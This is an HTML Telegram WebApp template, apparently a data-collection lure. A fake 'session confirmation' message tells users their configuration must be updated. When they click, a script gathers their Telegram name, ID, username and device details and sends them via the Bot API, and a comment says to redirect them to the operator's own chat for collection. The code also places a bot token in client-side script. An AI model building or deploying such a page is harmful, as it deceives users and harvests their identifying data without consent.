<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Сбор данных</title>
    <!-- Подключение официального скрипта Telegram WebApp -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            /* Базовые цвета из темы Telegram */
            --bg-color: var(--tg-theme-bg-color, #fff);
            --text-color: var(--tg-theme-text-color, #000);
            --button-color: var(--tg-theme-button-color, #3390ec);
            --button-text-color: var(--tg-theme-button-text-color, #fff);
            --secondary-bg: var(--tg-theme-secondary-bg-color, #f1f1f1);
            --hint-color: var(--tg-theme-hint-color, #999);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            transition: background-color 0.3s, color 0.3s;
        }

        .container {
            text-align: center;
            padding: 20px;
            width: 100%;
            max-width: 400px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        p {
            font-size: 15px;
            color: var(--hint-color);
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .btn {
            background-color: var(--button-color);
            color: var(--button-text-color);
            border: none;
            border-radius: 12px;
            padding: 16px 32px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
            transition: transform 0.1s, opacity 0.2s;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        .btn:active {
            transform: scale(0.98);
            opacity: 0.9;
        }

        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.5s;
            color: var(--tg-theme-link-color, var(--button-color));
        }

        .status.visible {
            opacity: 1;
        }
        
        /* Анимация пульсации для привлечения внимания */
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(var(--button-color-rgb, 51, 144, 236), 0); }
            100% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0); }
        }
        
        .btn {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Подтверждение сессии</h1>
        <p>Для продолжения работы приложения нам необходимо обновить данные вашей конфигурации. Нажмите кнопку ниже.</p>
        
        <button class="btn" id="sendBtn">Подтвердить</button>
        
        <div class="status" id="statusMessage">Данные успешно отправлены</div>
    </div>

    <script>
        // ВСТАВЬ СВОЙ ТОКЕН СЮДА
        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
        // Пример: const BOT_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';

        const tg = window.Telegram.WebApp;

        // Инициализация приложения
        tg.ready();
        tg.expand(); // Раскрываем на весь экран

        const sendBtn = document.getElementById('sendBtn');
        const statusMsg = document.getElementById('statusMessage');

        // Функция отправки данных
        function sendUserData() {
            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
                statusMsg.textContent = "Ошибка: Данные пользователя не найдены";
                statusMsg.classList.add('visible');
                return;
            }

            const user = tg.initDataUnsafe.user;
            const userAgent = navigator.userAgent;
            const screenRes = `${screen.width}x${screen.height}`;
            const platform = navigator.platform;
            const timestamp = new Date().toLocaleString();

            // Формируем сообщение
            const text = `
🔍 <b>Новая сессия</b>
👤 <b>Имя:</b> ${user.first_name} ${user.last_name ? user.last_name : ''}
🆔 <b>ID:</b> <code>${user.id}</b>
✉️ <b>Юзернейм:</b> ${user.username ? '@' + user.username : 'Нет'}
📱 <b>Устройство:</b> ${platform}
📺 <b>Экран:</b> ${screenRes}
🧪 <b>User-Agent:</b> ${userAgent.substring(0, 50)}...
🕒 <b>Время:</b> ${timestamp}
            `.trim();

            // Отправка через fetch
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: user.id, // Отправляем обратно пользователю (или замени на свой ID для сбора)
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(response => {
                if (response.ok) {
                    // Визуальный отклик
                    sendBtn.textContent = "Отправлено ✓";
                    sendBtn.style.backgroundColor = "#4caf50"; // Зеленый цвет успеха
                    statusMsg.classList.add('visible');
                    
                    // Опционально: закрыть приложение через 2 секунды
                    // setTimeout(() => tg.close(), 2000);
                } else {
                    statusMsg.textContent = "Ошибка отправки";
                    statusMsg.classList.add('visible');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                statusMsg.textContent = "Нет связи";
                statusMsg.classList.add('visible');
            });
        }

        // Слушатель нажатия
        sendBtn.addEventListener('click', () => {
            sendBtn.disabled = true; // Блокируем повторные нажатия
            sendBtn.style.animation = "none"; // Останавливаем пульсацию
            sendUserData();
        });

    </script>
</body>
</html>
